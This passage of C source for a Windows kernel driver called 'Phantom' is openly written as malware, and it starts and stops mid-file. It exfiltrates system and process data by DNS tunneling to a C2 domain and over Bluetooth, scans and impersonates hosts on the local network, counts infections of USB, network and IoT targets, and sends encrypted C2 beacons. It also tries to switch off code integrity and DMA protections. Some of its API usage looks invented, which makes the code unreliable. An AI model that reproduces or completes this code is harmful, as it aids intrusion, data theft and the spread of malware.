                      buffer, bufferSize, &offset, NULL);
            if (!NT_SUCCESS(status)) {
                KdPrint(("Failed to repair infection: 0x%08X\n", status));
                break;
            }
        }
        
        offset.QuadPart += bufferSize;
    }

    // Cleanup
    if (buffer) {
        ExFreePoolWithTag(buffer, 'rpeR');
    }
    ZwClose(fileHandle);

    return status;
}


// Helper functions for targeting
BOOLEAN IsTargetDay() {
    LARGE_INTEGER systemTime;
    TIME_FIELDS timeFields;
    
    KeQuerySystemTime(&systemTime);
    RtlTimeToTimeFields(&systemTime, &timeFields);
    
    return timeFields.Weekday == TARGET_DAY_OF_WEEK;
}


// Data exfiltration functions
NTSTATUS PhantomExfiltrateData(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    // DNS tunneling exfiltration
    UNICODE_STRING dnsDevice = RTL_CONSTANT_STRING(L"\\Device\\Dns");
    PFILE_OBJECT dnsFileObject;
    PDEVICE_OBJECT dnsDevice;

    NTSTATUS status = IoGetDeviceObjectPointer(
        &dnsDevice,
        FILE_READ_DATA | FILE_WRITE_DATA,
        &dnsFileObject,
        &dnsDevice
    );

    if (NT_SUCCESS(status)) {
        // Encode sensitive data into DNS queries
        UCHAR encodedData[256];
        ULONG encodedLength = 0;

        // Gather system info
        SYSTEM_BASIC_INFORMATION sysInfo;
        status = ZwQuerySystemInformation(
            SystemBasicInformation,
            &sysInfo,
            sizeof(sysInfo),
            NULL
        );

        if (NT_SUCCESS(status)) {
            // Pack system info into encoded data
            RtlCopyMemory(encodedData, &sysInfo, sizeof(sysInfo));
            encodedLength = sizeof(sysInfo);

            // Add process list
            ULONG processListSize = 0;
            status = ZwQuerySystemInformation(
                SystemProcessInformation,
                NULL,
                0,
                &processListSize
            );

            if (processListSize > 0) {
                PVOID processList = ExAllocatePool2(POOL_FLAG_NON_PAGED, processListSize, 'PrcL');
                if (processList) {
                    status = ZwQuerySystemInformation(
                        SystemProcessInformation,
                        processList,
                        processListSize,
                        NULL
                    );

                    if (NT_SUCCESS(status)) {
                        // Pack process info after system info
                        RtlCopyMemory(
                            encodedData + encodedLength,
                            processList,
                            min(processListSize, sizeof(encodedData) - encodedLength)
                        );
                        encodedLength += min(processListSize, sizeof(encodedData) - encodedLength);
                    }
                    ExFreePoolWithTag(processList, 'PrcL');
                }
            }

            // Split data into DNS-sized chunks and exfiltrate
            for (ULONG i = 0; i < encodedLength; i += 63) {
                WCHAR dnsQuery[256];
                UCHAR chunk[64];
                ULONG chunkSize = min(63, encodedLength - i);

                // Copy chunk
                RtlCopyMemory(chunk, &encodedData[i], chunkSize);

                // Base32 encode chunk
                WCHAR encodedChunk[128];
                for (ULONG j = 0; j < chunkSize; j += 5) {
                    ULONG n = ((ULONG)chunk[j] << 24) |
                             ((j + 1 < chunkSize ? chunk[j + 1] : 0) << 16) |
                             ((j + 2 < chunkSize ? chunk[j + 2] : 0) << 8) |
                             ((j + 3 < chunkSize ? chunk[j + 3] : 0));

                    encodedChunk[j/5*8] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"[(n >> 27) & 0x1F];
                    encodedChunk[j/5*8 + 1] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"[(n >> 22) & 0x1F];
                    encodedChunk[j/5*8 + 2] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"[(n >> 17) & 0x1F];
                    encodedChunk[j/5*8 + 3] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"[(n >> 12) & 0x1F];
                    encodedChunk[j/5*8 + 4] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"[(n >> 7) & 0x1F];
                    encodedChunk[j/5*8 + 5] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"[(n >> 2) & 0x1F];
                    encodedChunk[j/5*8 + 6] = L"ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"[((n & 0x3) << 3)];
                    encodedChunk[j/5*8 + 7] = L'=';
                }
                encodedChunk[chunkSize * 8 / 5] = L'\0';

                // Format DNS query
                RtlStringCbPrintfW(
                    dnsQuery,
                    sizeof(dnsQuery),
                    L"%ws.exfil.c2domain.com",
                    encodedChunk
                );

                // Send DNS query via IRP
                KEVENT event;
                KeInitializeEvent(&event, NotificationEvent, FALSE);

                PIRP queryIrp = IoBuildDeviceIoControlRequest(
                    IOCTL_DNS_QUERY,
                    dnsDevice,
                    dnsQuery,
                    sizeof(dnsQuery),
                    NULL,
                    0,
                    FALSE,
                    &event,
                    NULL
                );

                if (queryIrp) {
                    status = IoCallDriver(dnsDevice, queryIrp);
                    if (status == STATUS_PENDING) {
                        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
                    }
                }

                // Add delay between queries
                LARGE_INTEGER interval;
                interval.QuadPart = -10000000; // 1 second
                KeDelayExecutionThread(KernelMode, FALSE, &interval);
            }
        }
        ObDereferenceObject(dnsFileObject);
    }

    // Bluetooth exfiltration
    UNICODE_STRING btDevices = RTL_CONSTANT_STRING(L"\\Device\\Bluetooth");
    PFILE_OBJECT btFileObject;
    PDEVICE_OBJECT btDevice;

    status = IoGetDeviceObjectPointer(
        &btDevices,
        FILE_READ_DATA | FILE_WRITE_DATA,
        &btFileObject,
        &btDevice
    );

    if (NT_SUCCESS(status)) {
        // Scan for nearby Bluetooth devices
        BTH_INQUIRY_RESULT btResults[MAX_BT_DEVICES];
        ULONG resultSize = sizeof(BTH_INQUIRY_RESULT) * MAX_BT_DEVICES;
        ULONG numDevices = 0;

        // Send inquiry scan IRP
        KEVENT scanEvent;
        KeInitializeEvent(&scanEvent, NotificationEvent, FALSE);

        IO_STATUS_BLOCK scanIoStatus;
        PIRP scanIrp = IoBuildDeviceIoControlRequest(
            IOCTL_BTH_FIND_DEVICES,
            btDevice,
            NULL,
            0,
            btResults,
            resultSize,
            FALSE,
            &scanEvent,
            &scanIoStatus
        );

        if (scanIrp) {
            status = IoCallDriver(btDevice, scanIrp);
            if (status == STATUS_PENDING) {
                KeWaitForSingleObject(&scanEvent, Executive, KernelMode, FALSE, NULL);
                status = scanIoStatus.Status;
                numDevices = scanIoStatus.Information / sizeof(BTH_INQUIRY_RESULT);
            }
        }

        if (NT_SUCCESS(status) && numDevices > 0) {
            // For each discovered device
            for (ULONG i = 0; i < numDevices; i++) {
                BTH_SDP_CONNECT_RESPONSE sdpResponse;
                BTH_SDP_STREAM_RESPONSE streamResponse;
                
                // Connect to device's SDP service
                KEVENT sdpEvent;
                KeInitializeEvent(&sdpEvent, NotificationEvent, FALSE);

                IO_STATUS_BLOCK sdpIoStatus;
                PIRP sdpIrp = IoBuildDeviceIoControlRequest(
                    IOCTL_BTH_SDP_CONNECT,
                    btDevice,
                    &btResults[i].Address,
                    sizeof(BTH_ADDR),
                    &sdpResponse,
                    sizeof(BTH_SDP_CONNECT_RESPONSE),
                    FALSE,
                    &sdpEvent,
                    &sdpIoStatus
                );

                if (sdpIrp) {
                    status = IoCallDriver(btDevice, sdpIrp);
                    if (status == STATUS_PENDING) {
                        KeWaitForSingleObject(&sdpEvent, Executive, KernelMode, FALSE, NULL);
                        status = sdpIoStatus.Status;
                    }

                    if (NT_SUCCESS(status)) {
                        // Search for our C2 service UUID
                        BTH_SDP_SERVICE_ATTRIBUTE_SEARCH search;
                        search.ServiceHandle = sdpResponse.ServiceHandle;
                        search.AttributeRange.First = SDP_ATTRIB_PROTOCOL_DESCRIPTOR_LIST;
                        search.AttributeRange.Last = SDP_ATTRIB_PROTOCOL_DESCRIPTOR_LIST;

                        KEVENT searchEvent;
                        KeInitializeEvent(&searchEvent, NotificationEvent, FALSE);

                        IO_STATUS_BLOCK searchIoStatus;
                        PIRP searchIrp = IoBuildDeviceIoControlRequest(
                            IOCTL_BTH_SDP_SERVICE_ATTRIBUTE_SEARCH,
                            btDevice,
                            &search,
                            sizeof(search),
                            &streamResponse,
                            sizeof(streamResponse),
                            FALSE,
                            &searchEvent,
                            &searchIoStatus
                        );

                        if (searchIrp) {
                            status = IoCallDriver(btDevice, searchIrp);
                            if (status == STATUS_PENDING) {
                                KeWaitForSingleObject(&searchEvent, Executive, KernelMode, FALSE, NULL);
                                status = searchIoStatus.Status;
                            }

                            if (NT_SUCCESS(status)) {
                                // Found C2 service - connect RFCOMM channel
                                BTH_CONNECT_REQUEST connectRequest;
                                connectRequest.Address = btResults[i].Address;
                                connectRequest.Channel = streamResponse.Channel;

                                KEVENT connectEvent;
                                KeInitializeEvent(&connectEvent, NotificationEvent, FALSE);

                                IO_STATUS_BLOCK connectIoStatus;
                                PIRP connectIrp = IoBuildDeviceIoControlRequest(
                                    IOCTL_BTH_CONNECT,
                                    btDevice,
                                    &connectRequest,
                                    sizeof(connectRequest),
                                    NULL,
                                    0,
                                    FALSE,
                                    &connectEvent,
                                    &connectIoStatus
                                );

                                if (connectIrp) {
                                    status = IoCallDriver(btDevice, connectIrp);
                                    if (status == STATUS_PENDING) {
                                        KeWaitForSingleObject(&connectEvent, Executive, KernelMode, FALSE, NULL);
                                        status = connectIoStatus.Status;
                                    }

                                    if (NT_SUCCESS(status)) {
                                        // Connected - send system info
                                        SYSTEM_BASIC_INFORMATION sysInfo;
                                        status = ZwQuerySystemInformation(
                                            SystemBasicInformation,
                                            &sysInfo,
                                            sizeof(sysInfo),
                                            NULL
                                        );

                                        if (NT_SUCCESS(status)) {
                                            KEVENT writeEvent;
                                            KeInitializeEvent(&writeEvent, NotificationEvent, FALSE);

                                            IO_STATUS_BLOCK writeIoStatus;
                                            PIRP writeIrp = IoBuildDeviceIoControlRequest(
                                                IOCTL_BTH_WRITE,
                                                btDevice,
                                                &sysInfo,
                                                sizeof(sysInfo),
                                                NULL,
                                                0,
                                                FALSE,
                                                &writeEvent,
                                                &writeIoStatus
                                            );

                                            if (writeIrp) {
                                                status = IoCallDriver(btDevice, writeIrp);
                                                if (status == STATUS_PENDING) {
                                                    KeWaitForSingleObject(&writeEvent, Executive, KernelMode, FALSE, NULL);
                                                }
                                            }

                                            // Disconnect
                                            BTH_DISCONNECT_REQUEST disconnectRequest;
                                            disconnectRequest.Address = btResults[i].Address;
                                            disconnectRequest.Channel = streamResponse.Channel;

                                            KEVENT disconnectEvent; 
                                            KeInitializeEvent(&disconnectEvent, NotificationEvent, FALSE);

                                            IO_STATUS_BLOCK disconnectIoStatus;
                                            PIRP disconnectIrp = IoBuildDeviceIoControlRequest(
                                                IOCTL_BTH_DISCONNECT,
                                                btDevice,
                                                &disconnectRequest,
                                                sizeof(disconnectRequest),
                                                NULL,
                                                0,
                                                FALSE,
                                                &disconnectEvent,
                                                &disconnectIoStatus
                                            );

                                            if (disconnectIrp) {
                                                IoCallDriver(btDevice, disconnectIrp);
                                                KeWaitForSingleObject(&disconnectEvent, Executive, KernelMode, FALSE, NULL);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
        ObDereferenceObject(btFileObject);
    }

    return STATUS_SUCCESS;
}

// Query TCP/IP information
NTSTATUS TCPQueryInformationEx(
    PDEVICE_OBJECT DeviceObject,
    PTCP_REQUEST_QUERY_INFORMATION_EX QueryInfo,
    PVOID Buffer,
    PULONG BufferSize
) {
    NTSTATUS status;
    KEVENT event;
    IO_STATUS_BLOCK ioStatusBlock;
    PIRP irp;

    // Initialize event
    KeInitializeEvent(&event, NotificationEvent, FALSE);

    // Build IRP for TCP query
    irp = IoBuildDeviceIoControlRequest(
        IOCTL_TCP_QUERY_INFORMATION_EX,
        DeviceObject,
        QueryInfo,
        sizeof(TCP_REQUEST_QUERY_INFORMATION_EX),
        Buffer,
        *BufferSize,
        FALSE,
        &event,
        &ioStatusBlock
    );

    if (!irp) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Send IRP
    status = IoCallDriver(DeviceObject, irp);

    // Wait if pending
    if (status == STATUS_PENDING) {
        KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
        status = ioStatusBlock.Status;
    }

    // Update buffer size
    if (NT_SUCCESS(status)) {
        *BufferSize = (ULONG)ioStatusBlock.Information;
    }

    return status;
}


// Device cloning functions
NTSTATUS PhantomCloneDevice(
    PDEVICE_OBJECT DeviceObject,
    PIRP Irp
) {
    UNREFERENCED_PARAMETER(DeviceObject);
    UNREFERENCED_PARAMETER(Irp);

    // Only clone if we have space
    if (g_NumClonedDevices >= MAX_CLONED_DEVICES) {
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    // Open TCP/IP device
    UNICODE_STRING networkDevices = RTL_CONSTANT_STRING(L"\\Device\\Tcpip");
    PFILE_OBJECT netFileObject;
    PDEVICE_OBJECT netDevice;
    
    NTSTATUS status = IoGetDeviceObjectPointer(
        &networkDevices,
        FILE_READ_DATA | FILE_WRITE_DATA,
        &netFileObject,
        &netDevice
    );

    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to open TCP/IP device: 0x%08X\n", status));
        return status;
    }

    // Get adapter info
    TCP_REQUEST_QUERY_INFORMATION_EX queryInfo = {0};
    queryInfo.ID.toi_entity.tei_entity = CL_NL_ENTITY;
    queryInfo.ID.toi_entity.tei_instance = 0;
    queryInfo.ID.toi_class = INFO_CLASS_PROTOCOL;
    queryInfo.ID.toi_type = INFO_TYPE_ADDRESS_OBJECT;

    ULONG bufferSize = 0;
    status = TCPQueryInformationEx(
        netDevice,
        &queryInfo,
        NULL,
        &bufferSize
    );

    if (status != STATUS_BUFFER_OVERFLOW) {
        KdPrint(("Failed to get adapter info size: 0x%08X\n", status));
        ObDereferenceObject(netFileObject);
        return status;
    }

    // Allocate buffer for adapter info
    PVOID adapterBuffer = ExAllocatePool2(POOL_FLAG_NON_PAGED, bufferSize, 'AdpB');
    if (!adapterBuffer) {
        KdPrint(("Failed to allocate adapter buffer\n"));
        ObDereferenceObject(netFileObject);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    status = TCPQueryInformationEx(
        netDevice,
        &queryInfo,
        adapterBuffer,
        &bufferSize
    );

    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to get adapter info: 0x%08X\n", status));
        ExFreePoolWithTag(adapterBuffer, 'AdpB');
        ObDereferenceObject(netFileObject);
        return status;
    }

    // Scan local subnet for each adapter
    TDIEntityID *entityList = (TDIEntityID*)adapterBuffer;
    for (ULONG adapterIdx = 0; adapterIdx < bufferSize/sizeof(TDIEntityID); adapterIdx++) {
        
        // Get adapter address
        IPAddr localAddr = 0;
        status = GetAdapterAddress(netDevice, entityList[adapterIdx], &localAddr);
        if (!NT_SUCCESS(status)) {
            KdPrint(("Failed to get adapter address: 0x%08X\n", status));
            continue;
        }

        // Scan subnet
        IPAddr subnetMask = 0xFFFFFF00; // 255.255.255.0
        IPAddr networkAddr = localAddr & subnetMask;

        for (ULONG hostPart = 1; hostPart < 255; hostPart++) {
            IPAddr targetIp = networkAddr | hostPart;
            if (targetIp == localAddr) continue;

            // ARP request to get MAC
            UCHAR macAddress[6];
            status = SendArpRequest(netDevice, targetIp, macAddress);
            if (!NT_SUCCESS(status)) {
                continue;
            }

            // Check if device is worth cloning by looking at open ports
            USHORT openPorts[MAX_PORTS];
            ULONG numPorts = 0;
            status = ScanDevicePorts(netDevice, targetIp, openPorts, &numPorts);
            
            if (!NT_SUCCESS(status) || numPorts == 0) {
                continue;
            }

            // Check for interesting services (HTTP, FTP, SSH etc)
            BOOLEAN hasInterestingServices = FALSE;
            for (ULONG i = 0; i < numPorts; i++) {
                if (openPorts[i] == 80 || openPorts[i] == 21 || 
                    openPorts[i] == 22 || openPorts[i] == 443 ||
                    openPorts[i] == 3389) {
                    hasInterestingServices = TRUE;
                    break;
                }
            }

            if (!hasInterestingServices) {
                continue;
            }

            // Create clone entry
            PCLONED_DEVICE clone = &g_ClonedDevices[g_NumClonedDevices];
            RtlCopyMemory(clone->MacAddress, macAddress, 6);
            clone->IpAddress = targetIp;
            
            // Generate unique name based on MAC
            RtlStringCbPrintfW(
                clone->DeviceName,
                sizeof(clone->DeviceName),
                L"NET_%02X%02X%02X%02X%02X%02X",
                macAddress[0], macAddress[1], macAddress[2],
                macAddress[3], macAddress[4], macAddress[5]
            );
            
            clone->Active = TRUE;
            g_NumClonedDevices++;

            // Set up packet filter to intercept traffic
            NDIS_PACKET_FILTER filter = NDIS_PACKET_TYPE_PROMISCUOUS | 
                                      NDIS_PACKET_TYPE_DIRECTED |
                                      NDIS_PACKET_TYPE_MULTICAST |
                                      NDIS_PACKET_TYPE_ALL_MULTICAST;

            status = NdisSetPacketFilter(netDevice, filter);
            if (!NT_SUCCESS(status)) {
                KdPrint(("Failed to set packet filter: 0x%08X\n", status));
                clone->Active = FALSE;
                continue;
            }

            // Set up protocol hooks
            status = InstallProtocolHooks(netDevice, clone);
            if (!NT_SUCCESS(status)) {
                KdPrint(("Failed to install protocol hooks: 0x%08X\n", status));
                clone->Active = FALSE;
                continue;
            }

            // Start mirroring thread for this clone
            HANDLE threadHandle;
            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, NULL, OBJ_KERNEL_HANDLE, NULL, NULL);

            status = PsCreateSystemThread(
                &threadHandle,
                THREAD_ALL_ACCESS,
                &objAttr,
                NULL,
                NULL,
                MirrorThreadProc,
                clone
            );

            if (!NT_SUCCESS(status)) {
                KdPrint(("Failed to create mirror thread: 0x%08X\n", status));
                clone->Active = FALSE;
                continue;
            }

            // Store thread handle
            status = ObReferenceObjectByHandle(
                threadHandle,
                THREAD_ALL_ACCESS,
                *PsThreadType,
                KernelMode,
                &clone->ThreadObject,
                NULL
            );

            ZwClose(threadHandle);

            if (!NT_SUCCESS(status)) {
                KdPrint(("Failed to get thread object: 0x%08X\n", status));
                clone->Active = FALSE;
                continue;
            }

            KdPrint(("Successfully cloned device %ws\n", clone->DeviceName));

            // Add delay between clones
            LARGE_INTEGER interval;
            interval.QuadPart = -30000000; // 3 seconds
            KeDelayExecutionThread(KernelMode, FALSE, &interval);
        }
    }

    ExFreePoolWithTag(adapterBuffer, 'AdpB');
    ObDereferenceObject(netFileObject);
    return STATUS_SUCCESS;
}

// AI behavior adaptation functions
// Infection Recording Function
VOID RecordInfectionAttempt(
    IN ULONG TargetType,
    IN BOOLEAN Success
) {
    // Acquire spinlock
    KIRQL oldIrql;
    KeAcquireSpinLock(&g_BehaviorHistoryLock, &oldIrql);

    // Record attempt
    PINFECTION_ATTEMPT attempt = &g_BehaviorHistory[g_BehaviorHistoryIndex];
    attempt->TargetType = TargetType;
    attempt->Success = Success;
    KeQuerySystemTime(&attempt->Timestamp);

    // Update metrics
    if (Success) {
        g_SuccessfulInfections++;
        switch(TargetType) {
            case TARGET_TYPE_USB:
                g_UsbInfections++;
                break;
            case TARGET_TYPE_NETWORK:
                g_NetworkInfections++;
                break;
            case TARGET_TYPE_IOT:
                g_IotInfections++;
                break;
        }
    } else {
        g_FailedInfections++;
        if (g_ConsecutiveFailures++ > 3) {
            g_InfectionBackoffTime *= 2;
            if (g_InfectionBackoffTime > MAX_BACKOFF_TIME) {
                g_InfectionBackoffTime = MAX_BACKOFF_TIME;
            }
        }
    }

    // Advance index
    g_BehaviorHistoryIndex = (g_BehaviorHistoryIndex + 1) % MAX_BEHAVIOR_HISTORY;

    // Release spinlock
    KeReleaseSpinLock(&g_BehaviorHistoryLock, oldIrql);
}

FLOAT GetSuccessRate(ULONG targetType) {
    KIRQL oldIrql;
    FLOAT successRate = 0.0f;
    ULONG attempts = 0;
    ULONG successes = 0;

    // Acquire spinlock to safely access history
    KeAcquireSpinLock(&g_BehaviorHistoryLock, &oldIrql);

    // Calculate success rate from behavior history
    for (ULONG i = 0; i < MAX_BEHAVIOR_HISTORY; i++) {
        if (g_BehaviorHistory[i].TargetType == targetType && 
            g_BehaviorHistory[i].Timestamp != 0) { // Only count valid entries
            
            attempts++;
            if (g_BehaviorHistory[i].Success) {
                successes++;
            }
        }
    }

    // Calculate rate if we have data
    if (attempts > 0) {
        successRate = (FLOAT)successes / attempts;
        
        // Sanity check the calculated rate
        if (successRate > 1.0f) {
            KdPrint(("Warning: Success rate calculation error - rate: %.2f, attempts: %lu, successes: %lu\n",
                successRate, attempts, successes));
            successRate = 1.0f;
        }
    }

    KeReleaseSpinLock(&g_BehaviorHistoryLock, oldIrql);

    if (g_DebugFlags & DBG_SUCCESS_RATE) {
        KdPrint(("GetSuccessRate - Type: %lu, Rate: %.2f%% (%lu/%lu)\n",
            targetType, successRate * 100.0f, successes, attempts));
    }

    return successRate;
}

// C2 beaconing functions
VOID BeaconDpcRoutine(
    PKDPC Dpc,
    PVOID DeferredContext, 
    PVOID SystemArgument1,
    PVOID SystemArgument2
) {
    UNREFERENCED_PARAMETER(Dpc);
    UNREFERENCED_PARAMETER(DeferredContext);
    UNREFERENCED_PARAMETER(SystemArgument1);
    UNREFERENCED_PARAMETER(SystemArgument2);

    // Check if system is idle
    SYSTEM_PROCESSOR_PERFORMANCE_INFORMATION perfInfo;
    NTSTATUS status = ZwQuerySystemInformation(
        SystemProcessorPerformanceInformation,
        &perfInfo,
        sizeof(perfInfo),
        NULL
    );

    if (NT_SUCCESS(status)) {
        // Only beacon if CPU usage is below 10%
        if (perfInfo.IdleTime.QuadPart > (perfInfo.KernelTime.QuadPart + perfInfo.UserTime.QuadPart) * 9) {
            
            // Prepare beacon data
            UCHAR beaconData[512] = {0};
            ULONG beaconSize = 0;

            // Add system info
            SYSTEM_BASIC_INFORMATION sysInfo;
            status = ZwQuerySystemInformation(
                SystemBasicInformation,
                &sysInfo,
                sizeof(sysInfo),
                NULL
            );

            if (NT_SUCCESS(status)) {
                RtlCopyMemory(beaconData, &sysInfo, sizeof(sysInfo));
                beaconSize += sizeof(sysInfo);

                // Add infection stats
                RtlCopyMemory(
                    beaconData + beaconSize,
                    &g_NumInfectedDevices,
                    sizeof(g_NumInfectedDevices)
                );
                beaconSize += sizeof(g_NumInfectedDevices);

                // Encrypt beacon data with RC4
                UCHAR key[] = {0x52, 0x75, 0x6E, 0x20, 0x46, 0x6F, 0x72, 0x65, 0x73, 0x74, 0x20, 0x52, 0x75, 0x6E};
                RC4_KEY rc4Key;
                RC4_set_key(&rc4Key, sizeof(key), key);
                RC4(&rc4Key, beaconSize, beaconData, beaconData);

                // Send encrypted beacon to C2
                PFILE_OBJECT fileObject;
                PDEVICE_OBJECT deviceObject;
                status = IoGetDeviceObjectPointer(
                    &g_C2ServerAddress,
                    FILE_WRITE_DATA,
                    &fileObject,
                    &deviceObject
                );

                if (NT_SUCCESS(status)) {
                    KEVENT event;
                    KeInitializeEvent(&event, NotificationEvent, FALSE);

                    PIRP irp = IoBuildSynchronousFsdRequest(
                        IRP_MJ_WRITE,
                        deviceObject,
                        beaconData,
                        beaconSize,
                        NULL,
                        &event,
                        NULL
                    );

                    if (irp != NULL) {
                        status = IoCallDriver(deviceObject, irp);
                        if (status == STATUS_PENDING) {
                            KeWaitForSingleObject(&event, Executive, KernelMode, FALSE, NULL);
                            status = irp->IoStatus.Status;
                        }
                    }

                    ObDereferenceObject(fileObject);
                }
            }
        }
    }

    // Reschedule beacon with jitter
    LARGE_INTEGER dueTime;
    ULONG jitter = (ULONG)RtlRandomEx(&g_Seed) % (BEACON_INTERVAL / 10);
    dueTime.QuadPart = -10000000LL * (BEACON_INTERVAL + jitter);
    KeSetTimer(&g_BeaconTimer, dueTime, &g_BeaconDpc);
}

// Driver entry point
NTSTATUS DriverEntry(
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
) {
    UNREFERENCED_PARAMETER(RegistryPath);
    NTSTATUS status;

    // Initialize random seed using system time and performance counter for better entropy
    LARGE_INTEGER systemTime, perfCounter;
    KeQuerySystemTime(&systemTime);
    KeQueryPerformanceCounter(&perfCounter);
    g_Seed = (ULONG)(systemTime.LowPart ^ perfCounter.LowPart);


    // Silently elevate privileges before proceeding
    HANDLE tokenHandle;
    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);
    
    status = ZwOpenProcessTokenEx(
        NtCurrentProcess(),
        TOKEN_ALL_ACCESS, 
        OBJ_KERNEL_HANDLE,
        &tokenHandle
    );

    // Disable memory integrity and DMA protections
    SYSTEM_CODEINTEGRITY_INFORMATION sci = {0};
    sci.Length = sizeof(sci);
    status = ZwQuerySystemInformation(SystemCodeIntegrityInformation, &sci, sizeof(sci), NULL);
    if (NT_SUCCESS(status)) {
        sci.CodeIntegrityOptions &= ~CODEINTEGRITY_OPTION_ENABLED;
        sci.CodeIntegrityOptions &= ~CODEINTEGRITY_OPTION_HVCI_KMCI_ENABLED;
        ZwSetSystemInformation(SystemCodeIntegrityInformation, &sci, sizeof(sci));
    }

    // Disable DMA remapping
    SYSTEM_DMA_GUARD_POLICY_INFORMATION dmaPolicy = {0};
    dmaPolicy.DmaGuardPolicyEnabled = FALSE;
    ZwSetSystemInformation(SystemDmaGuardPolicyInformation, &dmaPolicy, sizeof(dmaPolicy));

    if (NT_SUCCESS(status)) {
        // Enable all privileges silently
        TOKEN_PRIVILEGES privileges;
        privileges.PrivilegeCount = 1;
        privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        privileges.Privileges[0].Luid.LowPart = SE_DEBUG_PRIVILEGE;
        privileges.Privileges[0].Luid.HighPart = 0;

        ZwAdjustPrivilegesToken(
            tokenHandle,
            FALSE,
            &privileges, 
            sizeof(privileges),
            NULL,
            NULL
        );

        ZwClose(tokenHandle);
    }

    // Check targeting criteria before proceeding
    WCHAR systemRoot[MAX_PATH];
    if (!GetSystemRoot(systemRoot)) {
        KdPrint(("Failed to get system root path\n"));
        return STATUS_UNSUCCESSFUL;
    }

    if (!IsSystemInTargetTimeWindow() || !IsSystemInTargetRegion(systemRoot)) {
        KdPrint(("System does not meet targeting criteria\n"));
        return STATUS_UNSUCCESSFUL;
    }

    // Initialize global variables
    g_NumInfectedDevices = 0;
    g_NumBehaviorRecords = 0;
    g_NumClonedDevices = 0;
    KeInitializeSpinLock(&g_DeviceListLock);
    KeInitializeSpinLock(&g_BehaviorLock);
    KeInitializeSpinLock(&g_ClonedDeviceLock);

    // Create device object with specific characteristics
    UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\PhantomDevice");
    status = IoCreateDevice(
        DriverObject,
        0,
        &deviceName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN | FILE_DEVICE_ALLOW_APPCONTAINER_TRAVERSAL,
        FALSE,
        &g_PhantomDevice
    );

    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to create device object: 0x%08X\n", status));
        return status;
    }

    // Set device flags and characteristics
    g_PhantomDevice->Flags |= DO_BUFFERED_IO;
    g_PhantomDevice->Flags &= ~DO_DEVICE_INITIALIZING;
    g_PhantomDevice->Characteristics |= FILE_DEVICE_SECURE_OPEN;

    // Initialize resurrection timer and DPC with error handling
    KeInitializeTimer(&g_ResurrectionTimer);
    KeInitializeDpc(&g_ResurrectionDpc, PhantomResurrectionDpcRoutine, NULL);
    g_ResurrectionDpc.DeferredRoutine = PhantomResurrectionDpcRoutine;
    g_ResurrectionDpc.DeferredContext = NULL;

    // Initialize C2 beacon timer and DPC with specific context and error handling
    KeInitializeTimer(&g_BeaconTimer);
    PBEACON_CONTEXT beaconContext = (PBEACON_CONTEXT)ExAllocatePoolWithTag(NonPagedPool, sizeof(BEACON_CONTEXT), 'noCB');
    if (!beaconContext) {
        KdPrint(("Failed to allocate beacon context\n"));
        IoDeleteDevice(g_PhantomDevice);
        return STATUS_INSUFFICIENT_RESOURCES;
    }

    RtlZeroMemory(beaconContext, sizeof(BEACON_CONTEXT));
    beaconContext->DeviceObject = g_PhantomDevice;
    beaconContext->FailedAttempts = 0;
    beaconContext->LastBeaconTime.QuadPart = 0;
    beaconContext->RetryInterval = INITIAL_RETRY_INTERVAL;
    
    KeInitializeDpc(&g_BeaconDpc, BeaconDpcRoutine, beaconContext);
    g_BeaconDpc.DeferredRoutine = BeaconDpcRoutine;
    g_BeaconDpc.DeferredContext = beaconContext;

    // Set up dispatch routines with proper handlers and parameter validation
    DriverObject->DriverUnload = DriverUnload;
    DriverObject->MajorFunction[IRP_MJ_CREATE] = PhantomCreateClose;
    DriverObject->MajorFunction[IRP_MJ_CLOSE] = PhantomCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = PhantomDeviceControl;
    DriverObject->MajorFunction[IRP_MJ_READ] = PhantomReadWrite;
    DriverObject->MajorFunction[IRP_MJ_WRITE] = PhantomReadWrite;
    DriverObject->MajorFunction[IRP_MJ_SYSTEM_CONTROL] = PhantomSystemControl;
    DriverObject->MajorFunction[IRP_MJ_INTERNAL_DEVICE_CONTROL] = PhantomInternalDeviceControl;
    
    // Set default handlers for remaining functions with logging
    for (ULONG i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++) {
        if (DriverObject->MajorFunction[i] == NULL) {
            DriverObject->MajorFunction[i] = PhantomDefaultHandler;
            KdPrint(("Set default handler for major function %d\n", i));
        }
    }

    // Create symbolic link for user-mode access with proper error handling
    UNICODE_STRING symLink = RTL_CONSTANT_STRING(L"\\DosDevices\\Phantom");
    status = IoCreateSymbolicLink(&symLink, &deviceName);
    if (!NT_SUCCESS(status)) {
        KdPrint(("Failed to create symbolic link: 0x%08X\n", status));
        IoDeleteDevice(g_PhantomDevice);
        ExFreePoolWithTag(beaconContext, 'noCB');
        return status;
    }

    // Initialize global data structures with proper memory tags and error handling
    g_InfectedDevices = (PINFECTED_DEVICE)ExAllocatePoolWithTag(NonPagedPool, 
        MAX_INFECTED_DEVICES * sizeof(INFECTED_DEVICE), 'fnIP');
